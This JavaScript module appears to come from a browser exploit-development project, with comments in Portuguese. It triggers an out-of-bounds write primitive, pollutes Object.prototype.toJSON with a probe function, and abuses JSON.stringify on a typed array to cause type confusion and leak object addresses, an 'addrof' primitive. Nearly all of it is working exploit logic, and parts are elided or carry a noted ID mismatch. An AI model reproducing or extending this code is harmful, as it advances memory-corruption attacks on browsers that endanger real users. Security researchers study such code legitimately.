// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF, 0x7FFFFFFF]; 

let object_to_leak_A_v82 = null;
let object_to_leak_B_v82 = null; // Para a propriedade direta
let victim_typed_array_ref_v82 = null; // O Uint8Array principal
let probe_call_count_v82 = 0;
let marker_M1_ref_v82 = null; 
let marker_M2_ref_v82 = null; 
let details_of_M2_as_this_call_v82 = null; 
const PROBE_CALL_LIMIT_V82 = 7; 
const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;


function toJSON_TA_Probe_AdvancedGetterLeak() {
    probe_call_count_v82++;
    const call_num = probe_call_count_v82;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V82_AdvancedGetterLeak",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v82),
        this_is_M1: (this === marker_M1_ref_v82 && marker_M1_ref_v82 !== null),
        this_is_M2: (this === marker_M2_ref_v82 && marker_M2_ref_v82 !== null),
        m2_interaction_summary: null, 
        error_in_probe: null
    };
    // Atualiza o log global com o estado desta chamada, especialmente se for a última ou a mais relevante.
    if (current_call_log_info.this_is_M2 || !details_of_M2_as_this_call_v82 || call_num > (details_of_M2_as_this_call_v82.call_number || 0) ) {
        details_of_M2_as_this_call_v82 = current_call_log_info;
    }
    logS3(`[PROBE_V82] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V82) { return { recursion_stopped_v82: true }; }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            marker_M2_ref_v82 = { marker_id_v82: "M2_V82_Target" }; 
            marker_M1_ref_v82 = { marker_id_v82: "M1_V82_Container", payload_M2: marker_M2_ref_v82 };
            return marker_M1_ref_v82;
        } else if (call_num >= 2 && current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
            logS3(`[PROBE_V82] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v82}. Defining AGGRESSIVE getter...`, "vuln");
            current_call_log_info.m2_interaction_summary = { getter_defined: false, direct_prop_set: false };
            
            Object.defineProperty(this, 'leaky_A_getter_v82', {
                get: function() {
                    logS3(`[PROBE_V82] !!! Getter 'leaky_A_getter_v82' on confused M2 (this call #${call_num}) FIRED !!!`, "vuln");
                    if (!victim_typed_array_ref_v82 || !victim_typed_array_ref_v82.buffer) {
                        logS3("[PROBE_V82] Getter: victim_typed_array_ref_v82 or its buffer is null!", "error");
                        return "getter_victim_null_err";
                    }
                    let victim_view = new Float64Array(victim_typed_array_ref_v82.buffer);
                    let victim_u32_view = new Uint32Array(victim_typed_array_ref_v82.buffer);
                    const original_victim_val_idx0 = victim_view[0]; // Salvar valor original para restaurar

                    victim_view[0] = object_to_leak_A_v82; 
                    let leaked_val = victim_view[0];
                    let leaked_int64_str = new AdvancedInt64(victim_u32_view[0], victim_u32_view[1]).toString(true);
                    logS3(`[PROBE_V82] Getter: VictimView[0] after objA assignment: ${leaked_val} (Int64: ${leaked_int64_str})`, "leak");
                    
                    victim_view[0] = original_victim_val_idx0; // Restaurar valor original

                    if (typeof leaked_val === 'number' && !isNaN(leaked_val) && leaked_val !== 0) {
                        let adv = new AdvancedInt64(victim_u32_view[0], victim_u32_view[1]); // Re-ler após restauração? Não, usar o valor lido.
                        // Precisa usar os u32 do momento da leitura do 'leaked_val'
                        // Esta parte é complicada; a conversão para AdvancedInt64 deve usar os bytes de 'leaked_val'
                        // Se leaked_val já é o double, podemos criar o AdvInt64 a partir dele.
                        let temp_buf_for_advint = new ArrayBuffer(8);
                        new Float64Array(temp_buf_for_advint)[0] = leaked_val;
                        adv = new AdvancedInt64(new Uint32Array(temp_buf_for_advint)[0], new Uint32Array(temp_buf_for_advint)[1]);

                        if ((adv.high() > 0 && adv.high() < 0x000F0000) || ((adv.high() & 0xFFFF0000) === 0xFFFF0000 && adv.high() !== 0xFFFFFFFF) ) {
                           logS3(`[PROBE_V82] Getter: Potential pointer leaked: ${adv.toString(true)}`, "vuln");
                           return leaked_val; 
                        }
                    }
                    return "getter_no_addr_v82";
                }, enumerable: true, configurable: true
            });
            current_call_log_info.m2_interaction_summary.getter_defined = true;
            
            this.leaky_B_direct_v82 = object_to_leak_B_v82;
            current_call_log_info.m2_interaction_summary.direct_prop_set = true;
            
            return this; 
        }
    } catch (e) { current_call_log_info.error_in_probe = e.message; }
    
    return { generic_marker_v82: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}`;
    // ... (resto da função execute... similar à v79, mas usando variáveis _v82)
    // ... (loop sobre OOB_WRITE_VALUES_V82)
    // ... (dentro do loop, chamar a sonda, capturar details_of_M2_as_this_call_v82)
    // ... (analisar stringifyOutput_parsed.payload_M2.leaky_A_getter_v82 e leaky_B_direct_v82)
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (AdvancedGetterLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init...`;

    let overall_results = [];

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v82 = 0;
        victim_typed_array_ref_v82 = null; 
        marker_M1_ref_v82 = null;
        marker_M2_ref_v82 = null;
        details_of_M2_as_this_call_v82 = null;
        object_to_leak_A_v82 = { marker_A_v82: `LeakA_Val${toHex(current_oob_value)}`}; 
        object_to_leak_B_v82 = { marker_B_v82: `LeakB_Val${toHex(current_oob_value)}`};

        let iterError = null;
        let stringifyOutput_parsed = null; 
        
        let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};
        
        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done for iter Val${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            victim_typed_array_ref_v82 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            // Inicializar o buffer da vítima com um padrão conhecido para o getter
            new Float64Array(victim_typed_array_ref_v82.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);

            logS3(`STEP 2: victim_typed_array_ref_v82 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_AdvancedGetterLeak, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v82); 
                logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch (e_parse) { /* ... */ }
                
                logS3(`  EXECUTE: Details of M2 interaction call: ${details_of_M2_as_this_call_v82 ? JSON.stringify(details_of_M2_as_this_call_v82) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2 = details_of_M2_as_this_call_v82?.this_is_M2 && details_of_M2_as_this_call_v82?.this_type === "[object Object]";
                logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                let m2_payload_from_stringify = null;
                if (stringifyOutput_parsed?.marker_id_v81 === "M1_V81_Container" && stringifyOutput_parsed.payload_M2) { // Note: ID de M1 da v81, deve ser v82
                    m2_payload_from_stringify = stringifyOutput_parsed.payload_M2; 
                } else if (stringifyOutput_parsed?.marker_id_v82 === "M2_V82_Target") { // Se stringifyOutput é M2
                    m2_payload_from_stringify = stringifyOutput_parsed; 
                }

                if (m2_payload_from_stringify?.marker_id_v82 === "M2_V82_Target") {
                    const val_getter = m2_payload_from_stringify.leaky_A_getter_v82; 
                    if (typeof val_getter === 'number' && !isNaN(val_getter) && val_getter !== 0 && val_getter !== "getter_no_addr_v82" && val_getter !== FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD) {
                        let getter_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_getter]).buffer)[0], new Uint32Array(new Float64Array([val_getter]).buffer)[1]);
                        if ((getter_int64.high() > 0 && getter_int64.high() < 0x000F0000) || ((getter_int64.high() & 0xFFFF0000) === 0xFFFF0000  && getter_int64.high() !== 0xFFFFFFFF ) ) {
                           addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Possible pointer from getter: ${getter_int64.toString(true)}`;
                        } else { addrof_M2_Getter.msg = `Getter value is num but not ptr: ${val_getter} (${getter_int64.toString(true)})`; }
                    } else { addrof_M2_Getter.msg = `Getter value not useful num. Val: ${JSON.stringify(val_getter)}`; }

                    const val_direct = m2_payload_from_stringify.leaky_B_direct_v82;
                    if (val_direct && val_direct.marker_B_v82 === object_to_leak_B_v82.marker_B_v82) {
                         addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "object_to_leak_B_v82 identity from direct prop.";
                    } else { addrof_M2_Direct.msg = `Direct prop val not objB identity. Val: ${JSON.stringify(val_direct)}`; }
                } else { /* M2 não encontrado */ }

            } catch (e_str) { iterError = e_str;
            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
        } catch (e_outer) { iterError = e_outer;
        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({ /* ... */ }); // Captura de resultados da iteração
        if (addrof_M2_Getter.success || addrof_M2_Direct.success) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: Addr? Val${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(100); 
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    // ... (logging resumido de overall_results)
    let final_result_for_runner = {addrof_A_result: {success:false}, addrof_B_result: {success:false} }; 
    // ... (lógica para preencher final_result_for_runner)
    
    return { ...final_result_for_runner, iteration_results_summary: overall_results.map(r => ({/*...*/})), total_probe_calls: probe_call_count_v82 };
}
